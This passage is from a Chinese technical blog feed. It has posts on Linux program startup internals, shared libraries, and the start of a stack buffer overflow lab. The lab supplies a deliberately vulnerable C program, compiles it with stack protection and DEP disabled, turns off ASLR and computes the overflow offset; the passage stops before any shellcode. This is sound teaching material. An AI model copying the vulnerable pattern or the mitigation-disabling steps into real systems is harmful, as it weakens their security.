&lt;p&gt;首先我们用&lt;code class=&quot;highlighter-rouge&quot;&gt;readelf -h&lt;/code&gt;查看一下 &lt;em&gt;hello&lt;/em&gt; 的基本信息：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ readelf -h hello
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048310  //入口地址
  Start of program headers:          52 (bytes into file)
  Start of section headers:          6108 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         31
  Section header string table index: 28
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;hello&lt;/em&gt; 程序的入口地址是 &lt;em&gt;0x8048310&lt;/em&gt;，打开&lt;code class=&quot;highlighter-rouge&quot;&gt;GDB&lt;/code&gt;在 &lt;em&gt;0x8048310&lt;/em&gt; 设置断点，然后运行。程序停在了 &lt;em&gt;__start_&lt;/em&gt; 函数。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb ./hello -q

(gdb) b *0x8048310
Breakpoint 1 at 0x8048310
(gdb) r
Starting program: /home/me/tmp/hello/hello

Breakpoint 1, 0x08048310 in _start ()

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;我们反汇编一下 &lt;em&gt;__start_&lt;/em&gt; 函数：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) disas _start
Dump of assembler code for function _start:
   0x08048310 &amp;lt;+0&amp;gt;:	xor    %ebp,%ebp          //将 %ebx 清零
   0x08048312 &amp;lt;+2&amp;gt;:	pop    %esi               //将 argc 弹如 %esi
   0x08048313 &amp;lt;+3&amp;gt;:	mov    %esp,%ecx          //将 argv 存入 %ecx
   0x08048315 &amp;lt;+5&amp;gt;:	and    $0xfffffff0,%esp   
   0x08048318 &amp;lt;+8&amp;gt;:	push   %eax              
   0x08048319 &amp;lt;+9&amp;gt;:	push   %esp             //stck end
   0x0804831a &amp;lt;+10&amp;gt;:	push   %edx             // _rtld_fini 函数地址
   0x0804831b &amp;lt;+11&amp;gt;:	push   $0x80484a0       // _fini 函数地址
   0x08048320 &amp;lt;+16&amp;gt;:	push   $0x8048440       // _init 函数地址
   0x08048325 &amp;lt;+21&amp;gt;:	push   %ecx             // argv
   0x08048326 &amp;lt;+22&amp;gt;:	push   %esi             // argc
   0x08048327 &amp;lt;+23&amp;gt;:	push   $0x804840b       // main 函数地址
   0x0804832c &amp;lt;+28&amp;gt;:	call   0x80482f0 &amp;lt;__libc_start_main@plt&amp;gt;
   0x08048331 &amp;lt;+33&amp;gt;:	hlt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;首先说明一下，在进入 &lt;em&gt;_start&lt;/em&gt; 函数数时 stack 里面存放的是 &lt;em&gt;argc&lt;/em&gt; 、 &lt;em&gt;argv&lt;/em&gt; 、 &lt;em&gt;env&lt;/em&gt; 。进入 &lt;em&gt;_start&lt;/em&gt; 函数后先将&lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;清0，然后将 &lt;em&gt;argc&lt;/em&gt; 弹到 &lt;code class=&quot;highlighter-rouge&quot;&gt;%esi&lt;/code&gt;中。此时&lt;code class=&quot;highlighter-rouge&quot;&gt;%esp&lt;/code&gt;已经指向 &lt;em&gt;argv&lt;/em&gt; ，再将 &lt;em&gt;argv&lt;/em&gt; 存入&lt;code class=&quot;highlighter-rouge&quot;&gt;%ecx&lt;/code&gt;中。再将&lt;code class=&quot;highlighter-rouge&quot;&gt;%esp&lt;/code&gt;设置为16字节对齐。接着连续执行8次压栈操作，这是将 &lt;em&gt;__libc_start_main&lt;/em&gt; 函数的的参数压入stack中，但是&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;的值对 &lt;em&gt;__libc_start_main&lt;/em&gt; 没有影响，这么做是为了对齐。将 &lt;em&gt;__libc_start_main&lt;/em&gt; 函数需要的参数都压入stack之后就是调用 &lt;em&gt;__libc_start_main&lt;/em&gt; 函数了。可以说 &lt;em&gt;_start&lt;/em&gt; 函数就是为 &lt;em&gt;__libc_start_main&lt;/em&gt; 函数做准备的。&lt;/p&gt;

&lt;p&gt;如果在 &lt;em&gt;__libc_start_main&lt;/em&gt; 函数处设一个断点，然后使用&lt;code class=&quot;highlighter-rouge&quot;&gt;bt&lt;/code&gt;就可以看到 &lt;em&gt;___libc_start_main&lt;/em&gt; 函数的参数情况。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb ./hello -q
Reading symbols from ./hello...(no debugging symbols found)...done.
(gdb) b __libc_start_main
Breakpoint 1 at 0x80482f0
(gdb) r
Starting program: /home/me/tmp/hello/hello

Breakpoint 1, __libc_start_main (main=0x804840b &amp;lt;main&amp;gt;, argc=1, argv=0xbffff034,
    init=0x8048440 &amp;lt;__libc_csu_init&amp;gt;, fini=0x80484a0 &amp;lt;__libc_csu_fini&amp;gt;,
    rtld_fini=0xb7fea880 &amp;lt;_dl_fini&amp;gt;, stack_end=0xbffff02c) at ../csu/libc-start.c:134
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;__libc_start_main_函数&quot;&gt;&lt;a href=&quot;#__libc_start_main_函数&quot;&gt;__libc_start_main_函数&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;从名字就可以看出来 ___libc_start_main 是一个库函数，所以不能直接调用 ___libc_start_main 函数，而是要通过&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;表来确定 ___libc_start_main 函数的地址。 ___libc_start_main 函数所做的工作主要有：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;处理 &lt;code class=&quot;highlighter-rouge&quot;&gt;setuid&lt;/code&gt; 、&lt;code class=&quot;highlighter-rouge&quot;&gt;setgid&lt;/code&gt;安全问题。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;启动线程。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将 &lt;code class=&quot;highlighter-rouge&quot;&gt;fini&lt;/code&gt;(hello-world程序本身的)和&lt;code class=&quot;highlighter-rouge&quot;&gt;rtld_fini&lt;/code&gt;(动态连接器的)作为参数传给&lt;code class=&quot;highlighter-rouge&quot;&gt;at_exit&lt;/code&gt;，使他们被&lt;code class=&quot;highlighter-rouge&quot;&gt;at_exit&lt;/code&gt;函数调用，完成清理工作。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;调用init函数&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;调用&lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;函数。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;调用&lt;code class=&quot;highlighter-rouge&quot;&gt;exit&lt;/code&gt;函数，经将&lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;函数的返回值返回给系统。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;__libc_csu_init函数&quot;&gt;&lt;a href=&quot;#__libc_csu_init函数&quot;&gt;__libc_csu_init函数&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;__libc_start_main&lt;/em&gt; 函数调用的 &lt;em&gt;_init&lt;/em&gt; 函数实际上是 &lt;em&gt;__libc_csu_init&lt;/em&gt; 函数，而 &lt;em&gt;__libc_csu_init&lt;/em&gt; 函数的也被添加到了 &lt;em&gt;hello&lt;/em&gt; 中，使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -d&lt;/code&gt;可以看到 &lt;em&gt;__libc_csu_init&lt;/em&gt; 函数汇编如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d hello
...
08048440 &amp;lt;__libc_csu_init&amp;gt;:
 8048440:	55                   	push   %ebp
 8048441:	57                   	push   %edi
 8048442:	56                   	push   %esi
 8048443:	53                   	push   %ebx
 8048444:	e8 f7 fe ff ff       	call   8048340 &amp;lt;__x86.get_pc_thunk.bx&amp;gt;
 8048449:	81 c3 b7 1b 00 00    	add    $0x1bb7,%ebx
 804844f:	83 ec 0c             	sub    $0xc,%esp
 8048452:	8b 6c 24 20          	mov    0x20(%esp),%ebp
 8048456:	8d b3 0c ff ff ff    	lea    -0xf4(%ebx),%esi
 804845c:	e8 47 fe ff ff       	call   80482a8 &amp;lt;_init&amp;gt;
 8048461:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
 8048467:	29 c6                	sub    %eax,%esi
 8048469:	c1 fe 02             	sar    $0x2,%esi
 804846c:	85 f6                	test   %esi,%esi
 804846e:	74 25                	je     8048495 &amp;lt;__libc_csu_init+0x55&amp;gt;
 8048470:	31 ff                	xor    %edi,%edi
 8048472:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 8048478:	83 ec 04             	sub    $0x4,%esp                        //循环开始
 804847b:	ff 74 24 2c          	pushl  0x2c(%esp)
 804847f:	ff 74 24 2c          	pushl  0x2c(%esp)
 8048483:	55                   	push   %ebp
 8048484:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
 804848b:	83 c7 01             	add    $0x1,%edi
 804848e:	83 c4 10             	add    $0x10,%esp
 8048491:	39 f7                	cmp    %esi,%edi
 8048493:	75 e3                	jne    8048478 &amp;lt;__libc_csu_init+0x38&amp;gt;   //循环结束
 8048495:	83 c4 0c             	add    $0xc,%esp
 8048498:	5b                   	pop    %ebx
 8048499:	5e                   	pop    %esi
 804849a:	5f                   	pop    %edi
 804849b:	5d                   	pop    %ebp
 804849c:	c3                   	ret    
 804849d:	8d 76 00             	lea    0x0(%esi),%esi

...

 08048340 &amp;lt;__x86.get_pc_thunk.bx&amp;gt;:
 8048340:	8b 1c 24             	mov    (%esp),%ebx
 8048343:	c3                   	ret    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;进入 &lt;em&gt;__libc_csu_init&lt;/em&gt; 函数后先将要使用到的几个寄存器压入stack中，然后紧接着就调用了 &lt;em&gt;__x86.get_pc_thunk.bx&lt;/em&gt; 函数。 &lt;em&gt;__x86.get_pc_thunk.bx&lt;/em&gt; 要做的工作就是将 &lt;em&gt;__libc_csu_init&lt;/em&gt; 函数中 &lt;code class=&quot;highlighter-rouge&quot;&gt;call __x86.get_pc_thunk.bx&lt;/code&gt; 指令的下一条指令的地址保存到&lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;中。接着 &lt;em&gt;__libc_csu_init&lt;/em&gt; 又会调用 &lt;em&gt;_init&lt;/em&gt; 函数， &lt;em&gt;_init&lt;/em&gt; 函数的也被添加到了 &lt;em&gt;hello&lt;/em&gt; 中。调用完 &lt;em&gt;_init&lt;/em&gt; 函数之后又会执行一个循环操作，主要是将 &lt;em&gt;argc&lt;/em&gt; 、 &lt;em&gt;argv&lt;/em&gt; 、 &lt;em&gt;envp&lt;/em&gt; 作为参数调用函数。对应的C代码如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void
__libc_csu_init (int argc, char **argv, char **envp)
{

  _init ();

  const size_t size = __init_array_end - __init_array_start;
  for (size_t i = 0; i &amp;lt; size; i++)
      (*__init_array_start [i]) (argc, argv, envp);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;_init函数&quot;&gt;&lt;a href=&quot;#_init函数&quot;&gt;_init函数&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;和 &lt;em&gt;_libc_csu_fini&lt;/em&gt; 函数一样， &lt;em&gt;_init&lt;/em&gt; 函数的也被添加到了 _hello_中， __init_函数的汇编代码如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;080482a8 &amp;lt;_init&amp;gt;:
 80482a8:	53                   	push   %ebx
 80482a9:	83 ec 08             	sub    $0x8,%esp
 80482ac:	e8 8f 00 00 00       	call   8048340 &amp;lt;__x86.get_pc_thunk.bx&amp;gt;
 80482b1:	81 c3 4f 1d 00 00    	add    $0x1d4f,%ebx
 80482b7:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 80482bd:	85 c0                	test   %eax,%eax
 80482bf:	74 05                	je     80482c6 &amp;lt;_init+0x1e&amp;gt;
 80482c1:	e8 3a 00 00 00       	call   8048300 &amp;lt;__libc_start_main@plt+0x10&amp;gt; (.got.plt)
 80482c6:	83 c4 08             	add    $0x8,%esp
 80482c9:	5b                   	pop    %ebx
 80482ca:	c3                   	ret    

 08048300 &amp;lt;.plt.got&amp;gt;:
 8048300:	ff 25 fc 9f 04 08    	jmp    *0x8049ffc
 8048306:	66 90                	xchg   %ax,%ax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;_init&lt;/em&gt; 函数执行完之后返回到 &lt;em&gt;__libc_csu_init&lt;/em&gt; 函数。 &lt;em&gt;__libc_csu_init&lt;/em&gt; 函数执行完成之后又返回到 &lt;em&gt;__libc_start_main&lt;/em&gt; 函数，然后我们的 &lt;em&gt;main&lt;/em&gt; 函数就开始被调用了。 &lt;em&gt;main&lt;/em&gt; 就不用说了， &lt;em&gt;main_函数执行完成之后会调用 _exit&lt;/em&gt; 做好收尾工作。这就是&lt;code class=&quot;highlighter-rouge&quot;&gt;hello-world&lt;/code&gt;程序执行的大致过程了。&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;可能有人会有这样的疑问： &lt;em&gt;main&lt;/em&gt; 函数的参数不是有三个( &lt;em&gt;argc&lt;/em&gt;、 &lt;em&gt;argv&lt;/em&gt;、 &lt;em&gt;envp&lt;/em&gt; )吗？按理说 &lt;em&gt;__libc_start_main&lt;/em&gt; 调用 &lt;em&gt;main&lt;/em&gt; 函数的时候应该将这三个参数都传递给 &lt;em&gt;main&lt;/em&gt; 函数的，但是为什么 &lt;em&gt;__libc_start_main&lt;/em&gt; 函数的参数只有 &lt;em&gt;argc&lt;/em&gt; 和 &lt;em&gt;argv&lt;/em&gt; 而没有 &lt;em&gt;envp&lt;/em&gt; 呢？这是因为 &lt;em&gt;__libc_start_main&lt;/em&gt; 函数通过调用 &lt;em&gt;__libc_init_first&lt;/em&gt; (源代码如下)就可以得到 &lt;em&gt;envp&lt;/em&gt; , 并将全局变量 &lt;em&gt;_environ&lt;/em&gt; 设置为 &lt;em&gt;envp&lt;/em&gt; ，所以在 &lt;em&gt;__libc_start_main&lt;/em&gt; 函数调用 &lt;em&gt;main&lt;/em&gt; 函数时就不需要再显示的传递 &lt;em&gt;envp&lt;/em&gt; 参数。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 通过调用 __libc_init_first 函数将 envp 存到全局变量 _environ 中

void __libc_init_first(int argc, char *arg0, ...)
{
    char **argv = &amp;amp;arg0, **envp = &amp;amp;argv[argc + 1];
    __environ = envp;
    __libc_init (argc, argv, envp);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;参考：&lt;br /&gt;
&lt;a href=&quot;http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html&quot;&gt;Linux x86 Program Start Up or - How the heck do we get to main()?&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://luomuxiaoxiao.com/?p=516&quot;&gt;Linux X86 程序启动 – main函数是如何被执行的？&lt;/a&gt;&lt;/p&gt;</content><author><name>Triangleowl</name></author><summary type="html">Table Of Contents hello-world的编译过程 hello-world的执行过程 函数的入口地址 __libc_start_main_函数 __libc_csu_init函数 _init函数</summary></entry><entry><title type="html">动态链接共享库</title><link href="http://localhost:4000/linux/2019/11/05/dynamic-libraries-share.html" rel="alternate" type="text/html" title="动态链接共享库" /><published>2019-11-05T00:00:00+08:00</published><updated>2019-11-05T00:00:00+08:00</updated><id>http://localhost:4000/linux/2019/11/05/dynamic-libraries-share</id><content type="html" xml:base="http://localhost:4000/linux/2019/11/05/dynamic-libraries-share.html">&lt;h3 id=&quot;共享库的优点&quot;&gt;&lt;a href=&quot;#共享库的优点&quot;&gt;共享库的优点&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;和静态库相比，共享库主要有一下几个优点：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;维护方便。静态库和所有软件一样，也需要定期维护和更新，如果程序是以静态方式链接的，则每次修改
库都需要重新编译并链接。如果程序很大，则编译和链接都很费时间。但是如果使用共享库则完全不存在这
个问题，只要更新共享库就行了，程序运行是会共享的加载更新过的库。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;节省内存。基本上每个程序C程序都使用标准I/O函数，比如&lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;scanf&lt;/code&gt;等。在运行程序时这些代码都
会被加载到每个进程的代码段中。如果有几百个程序都用到了某个库中的同一个函数，则需要将同一段代码加载
几百份到内存中，这样做极其浪费宝贵的内存资源。而使用共享库则只需要加载一份代码到内存中。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;共享库的出现解决了静态库的缺陷，共享库是一个&lt;code class=&quot;highlighter-rouge&quot;&gt;目标模块&lt;/code&gt;，只有在用到的时候才会加载，而且可以加载到任意
地址，并且和正在内存中运行的进程链接起来。&lt;/p&gt;

&lt;h3 id=&quot;位置无关代码&quot;&gt;&lt;a href=&quot;#位置无关代码&quot;&gt;位置无关代码&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;共享库的一个主要目标就是允许多个进程共享加载到内存的相同代码库，从而节约宝贵的内存资源。那么进程间
是如何共享同一段代码的呢？一个简单的方法是给每个库分配一个专用的地址空间，然后加载器就按照分配的地址
将代码加载到内存中。但是问题又来了，如果一个库修改之后占用的内存空间变大了，这是就要考虑原来计划分配
的地址空间还适合修改之后的大小，如果不合适则要重新分配内存空间。如果有几百个库，则库的内存管理则变成
一个十分棘手的问题。&lt;/p&gt;

&lt;p&gt;共享代码也有一个很大的问题，那就是共享代码也要处理数据，而数据存在内存中。如果多个进程共享库中的代码
和库的数据，那么不同进程对数据进行不同的操作，最后的结果就使数据乱套。所以每个进程只能共享库的代码，
而不能共享库的数据。因为代码只具有&lt;code class=&quot;highlighter-rouge&quot;&gt;R-E&lt;/code&gt;属性，虽然多个进程可以同时使用一份代码，但是不能修改代码，而
每个进程都有一份自己的数据来公共享代码访问，这样就能保证数据的安全和准确。&lt;/p&gt;

&lt;p&gt;但是问题又来了：既不能修改代码又要保证每个进程使用的共享库代码访问的是自己的数据。如何做到这一点呢？
如果无法解决这个问题就无法实现位置无关代码(Position-Independent Code，PIC)。实现PIC就要借助&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;和
&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;。具体内容可以参考：&lt;a href=&quot;https://triangleowl.github.io/linux/2019/11/06/Position-Independent-Code.html&quot;&gt;位置无关代码&lt;/a&gt;&lt;/p&gt;</content><author><name>Triangleowl</name></author><summary type="html">共享库的优点 和静态库相比，共享库主要有一下几个优点： 维护方便。静态库和所有软件一样，也需要定期维护和更新，如果程序是以静态方式链接的，则每次修改 库都需要重新编译并链接。如果程序很大，则编译和链接都很费时间。但是如果使用共享库则完全不存在这 个问题，只要更新共享库就行了，程序运行是会共享的加载更新过的库。</summary></entry><entry><title type="html">Return Oriented Programming-1</title><link href="http://localhost:4000/rop/Return-Oriented-Programming" rel="alternate" type="text/html" title="Return Oriented Programming-1" /><published>2019-11-02T00:00:00+08:00</published><updated>2019-11-02T00:00:00+08:00</updated><id>http://localhost:4000/rop/Return-Oriented-Programming</id><content type="html" xml:base="http://localhost:4000/rop/Return-Oriented-Programming">&lt;p&gt;源代码如下:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;$ cat level1.c
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

void vulnerable_function(){
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}
int main()
{
    vulnerable_function();
    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;step1编译源文件&quot;&gt;step1:编译源文件&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;32&lt;/code&gt;位系统:&lt;/em&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      gcc -fno-stack-protector -zexecstack level1.c -o level1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;64&lt;/code&gt;位系统:&lt;/em&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      gcc -fno-stack-protector -z execstack level1.c -o level1 -m32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;-fno-stack-protector&lt;/code&gt;作用是关掉stack protector, &lt;code class=&quot;highlighter-rouge&quot;&gt;-zexecstack&lt;/code&gt;作用是关掉&lt;code class=&quot;highlighter-rouge&quot;&gt;DEP&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;step2关闭aslr&quot;&gt;step2:关闭&lt;code class=&quot;highlighter-rouge&quot;&gt;ASLR&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;执行：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      sudo -s
      echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space
      exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;step3反汇编level1&quot;&gt;step3:反汇编&lt;code class=&quot;highlighter-rouge&quot;&gt;level1&lt;/code&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d level1

0000054d &amp;lt;vulnerable_function&amp;gt;:
 54d:	55                   	push   %ebp
 54e:	89 e5                	mov    %esp,%ebp
 550:	53                   	push   %ebx
 551:	81 ec 84 00 00 00    	sub    $0x84,%esp
 557:	e8 6a 00 00 00       	call   5c6 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
 55c:	05 78 1a 00 00       	add    $0x1a78,%eax
 561:	83 ec 04             	sub    $0x4,%esp
 564:	68 00 01 00 00       	push   $0x100
 569:	8d 95 78 ff ff ff    	lea    -0x88(%ebp),%edx        #the address of buf is $ebp-0x88
 56f:	52                   	push   %edx
 570:	6a 00                	push   $0x0
 572:	89 c3                	mov    %eax,%ebx
 574:	e8 57 fe ff ff       	call   3d0 &amp;lt;read@plt&amp;gt;
 579:	83 c4 10             	add    $0x10,%esp
 57c:	90                   	nop
 57d:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 580:	c9                   	leave  
 581:	c3                   	ret    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;通过查看&lt;code class=&quot;highlighter-rouge&quot;&gt;vulnerable_function()&lt;/code&gt;的汇编代码可以知道&lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;的地址为&lt;code class=&quot;highlighter-rouge&quot;&gt;$ebp-0x88&lt;/code&gt;,即&lt;code class=&quot;highlighter-rouge&quot;&gt;vulnerable_function()&lt;/code&gt;函数的&lt;code class=&quot;highlighter-rouge&quot;&gt;stack&lt;/code&gt;分布为：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      |----------------------|
      |                      |
      |----------------------|&amp;lt;-----return address(ebp+0x04)
      |                      |
      |----------------------|&amp;lt;-----ebp
      |                      |
      |                      |
      |                      |
      |                      |
      |                      |
      |----------------------|&amp;lt;-----buf(ebp-0x88)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;所以只要读入的数据大于&lt;code class=&quot;highlighter-rouge&quot;&gt;0x88+0x04&lt;/code&gt;就覆盖掉返回地址。接下来只要确定&lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;的地址，用&lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;的地址覆盖&lt;code class=&quot;highlighter-rouge&quot;&gt;return address&lt;/code&gt;即可将执行&lt;code class=&quot;highlighter-rouge&quot;&gt;buff&lt;/code&gt;内的&lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;step4确定buff的地址&quot;&gt;step4:确定&lt;code class=&quot;highlighter-rouge&quot;&gt;buff&lt;/code&gt;的地址&lt;/h3&gt;

&lt;p&gt;这里选用&lt;code class=&quot;highlighter-rouge&quot;&gt;140(0x88+0x04)&lt;/code&gt;个&lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;bbbb&lt;/code&gt;来作为输入，使程序&lt;code class=&quot;highlighter-rouge&quot;&gt;crash&lt;/code&gt;。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;在执行&lt;code class=&quot;highlighter-rouge&quot;&gt;level1&lt;/code&gt;之前要先开启&lt;code class=&quot;highlighter-rouge&quot;&gt;core dump&lt;/code&gt;,具体做法为：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ulimit -c unlimit
sudo -s
echo &quot;/tmp/core.%t&quot; &amp;gt; /proc/sys/kernel/core_pattern
exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;然后执行&lt;code class=&quot;highlighter-rouge&quot;&gt;level1&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;确定&lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;的地址：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb ./level1 /tmp/core.xxxxxxxx -q
Reading symbols from ./level1...(no debugging symbols found)...done.
[New LWP 30069]
Core was generated by `./level1'.
Program terminated with signal SIGILL, Illegal instruction.
#0  0xffffcf9e in ?? ()
